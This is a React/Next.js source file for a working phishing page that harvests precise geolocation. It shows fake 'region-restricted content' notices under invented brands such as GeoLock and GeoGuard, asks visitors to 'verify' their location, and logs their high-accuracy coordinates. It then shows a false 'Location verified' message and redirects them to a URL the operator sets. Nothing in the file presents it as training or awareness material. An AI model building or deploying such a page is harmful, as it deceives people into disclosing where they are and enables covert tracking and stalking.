
"use client";
import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { LocationData } from '@/types';
import { Button } from '@/components/ui/button';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, Package, Banknote, PlayCircle, Film, FileText, Globe, Gamepad2 } from 'lucide-react'; // Removed Truck, Sparkles. Added Gamepad2.

interface TemplateContent {
  title: string;
  actionText: string;
  message: string;
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string;
  brandName?: string;
  brandLogo?: React.ReactNode;
}

const templateContent: Record<string, TemplateContent> = {
  'restricted-website-access': {
    title: 'Access Restricted - Location Verification Required',
    actionText: 'Verify Location & Access Site',
    message: "This website cannot be viewed in all countries. Verify your location to gain access.",
    pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
    heroIcon: Globe,
    brandName: "Restricted Website Access",
    brandLogo: null,
  },
  'geo-restricted-service-access': {
    title: 'Service Unavailable - Location Verification Required',
    actionText: 'Verify Location to Access Service',
    message: "This service is not available in your current region. Verify your location to check eligibility and gain access.",
    pageSpecificMessage: "Many of our digital services, including premium streaming, online games, and specialized software, are subject to regional licensing. To access the service you're looking for, or to see available services in your area, please verify your location.",
    heroIcon: Gamepad2,
    brandName: "Geo-Restricted Service",
    brandLogo: null,
  },
  'content-unlock': {
    title: 'Unlock Region-Restricted Content',
    actionText: 'Verify Location to Access',
    message: 'This content cannot be viewed in all countries. Verify your location to gain access.',
    pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
    heroIcon: Lock,
    brandName: "Region-Restricted Content",
    brandLogo: null,
  },
  default: {
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};

// Define localStorage keys for redirection
const REDIRECT_URL_KEYS: Record<string, string> = {
  'content-unlock': 'contentUnlockRedirectUrl',
  'restricted-website-access': 'restrictedWebsiteRedirectUrl',
  'geo-restricted-service-access': 'geoRestrictedServiceRedirectUrl',
};

export default function LocationPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
  const [currentTime, setCurrentTime] = useState<string | null>(null);

  useEffect(() => {
    const updateCurrentTime = () => {
      setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateCurrentTime(); // Set time immediately
    const timerId = setInterval(updateCurrentTime, 60000); // Update every minute
    return () => clearInterval(timerId);
  }, []);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  useEffect(() => {
    if (status === 'captured') {
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          setStatusMessage("Location verified. Thank you. You will now be redirected.");
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2500);
        } else {
          // If the key exists but no URL, it means redirection is supported but not configured
          setStatusMessage("Location verified. Thank you. This window can now be closed.");
        }
      } else {
        // For templates that don't support redirection (e.g., security-alert, default)
        setStatusMessage("Location verified. Thank you. This window can now be closed.");
      }
    } else {
      setStatusMessage(undefined);
    }
  }, [status, templateId]);

  const handleLocationRequest = () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by your browser.');
      setStatus('error');
      addLog({ type: 'generic', data: { message: 'Geolocation not supported' } });
      return;
    }

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };

        addLog({ type: 'location', data: locationData });
        setStatus('captured');
        setIsLoading(false);
      },
      (err) => {
        let errorMessage = 'Unknown error occurred.';
        switch (err.code) {
          case err.PERMISSION_DENIED:
            errorMessage = 'Location access denied by user.';
            break;
          case err.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.';
            break;
          case err.TIMEOUT:
            errorMessage = 'The request to get user location timed out.';
            break;
        }
        setError(errorMessage);
        setStatus('error');
        addLog({ type: 'generic', data: { message: `Location error: ${errorMessage}` } });
        setIsLoading(false);
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  };

  const renderTemplateSpecificContent = () => {
    const HeroIcon = content.heroIcon || MapPin;
    return (
      <div className="space-y-4">
        {content.brandName && ( // Display brandName if it exists
          <div className={`flex items-center justify-center text-gray-700 mb-3 w-full ${
            (templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access')
            ? 'text-2xl font-bold'
            : 'text-xl font-semibold' // This case would be for 'security-alert' if it had a brandName, or future templates
          }`}>
            {content.brandLogo} {/* Only 'security-alert' (now removed) had a brandLogo; new ones use text only */}
            <span className={`${(templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') ? 'text-center' : ''}`}>{content.brandName}</span>
          </div>
        )}
        {/* The main title for the page is set by PhishingPageLayout's title prop.
            The content.message or specific descriptive texts are used below within each scenario.
        */}

        {/* 'security-alert' rendering block is removed */}

        { (templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') && (
          <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
            <CardContent className="space-y-4">
              {(() => {
                // Default hero icon from content object
                let ActualHeroIcon = content.heroIcon || MapPin;

                if (templateId === 'restricted-website-access') {
                  return (
                    <div className="flex justify-center items-center text-primary/70 relative w-20 h-20 mx-auto">
                      <Globe className="w-full h-full" />
                      <Lock className="w-10 h-10 absolute text-gray-500 opacity-75" style={{ transform: 'translate(20%, 20%)' }} />
                    </div>
                  );
                } else if (templateId === 'geo-restricted-service-access') {
                  return (
                    <div className="flex justify-center items-center text-primary/70 relative w-20 h-20 mx-auto">
                       <ActualHeroIcon className="w-full h-full" />
                       <Globe className="w-10 h-10 absolute text-gray-500 opacity-60" style={{ transform: 'translate(-25%, -20%)' }}/>
                    </div>
                  );
                }
                // Fallback for 'content-unlock' or if others don't have special rendering
                return <ActualHeroIcon className="w-20 h-20 text-primary/60 mx-auto" />;
              })()}
              <ShadcnCardTitle className="text-xl text-foreground font-semibold">{content.message}</ShadcnCardTitle>
              <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
            </CardContent>
          </ShadcnCard>
        )}

        {templateId === 'default' && (
           <div className="text-center space-y-4">
            <HeroIcon className="w-16 h-16 text-primary mx-auto" />
            <p className="text-xl text-muted-foreground">{content.message}</p>
          </div>
        )}
      </div>
    );
  };

  return (
    <PhishingPageLayout
        title={content.title} // Always pass content.title
        // isLoading={isLoading && status !== 'captured'} // Removed
        // error={error} // Removed
        // statusMessage={statusMessage} // Removed
    >
      <div className="space-y-6">
        {renderTemplateSpecificContent()}

        {status !== 'captured' && (
          <>
            {templateId === 'content-unlock' && (
              <p className="text-center text-sm text-gray-500 mb-2">
                Powered by GeoLock<sup>&trade;</sup>
              </p>
            )}
            {templateId === 'restricted-website-access' && (
              <p className="text-center text-sm text-gray-500 mb-2">
                Verification by GeoGuard<sup>&trade;</sup>
              </p>
            )}
            {templateId === 'geo-restricted-service-access' && (
              <p className="text-center text-sm text-gray-500 mb-2">
                Access validation by GeoPass<sup>&trade;</sup>
              </p>
            )}
            <Button
              onClick={handleLocationRequest}
              size="lg"
              className={`w-full text-lg py-6 shadow-md bg-accent hover:bg-accent/90 text-accent-foreground`} // Removed security-alert specific class
              disabled={isLoading || status === 'requesting'}
            >
              <MapPin className="mr-2 h-6 w-6" />
              {isLoading ? 'Verifying...' : content.actionText}
            </Button>
          </>
        )}

        {status === 'captured' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {statusMessage || "Location Verified"}
            </p>
            <p className="text-md text-green-600">
              { (REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== '')
                ? "Please wait while we redirect you..."
                : "This window can now be closed." }
            </p>
          </div>
        )}
        {status === 'error' && error && (
          <Alert variant="destructive" className="mt-6">
            <AlertTriangle className="h-5 w-5" />
            <AlertTitle>Location Access Failed</AlertTitle>
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
}

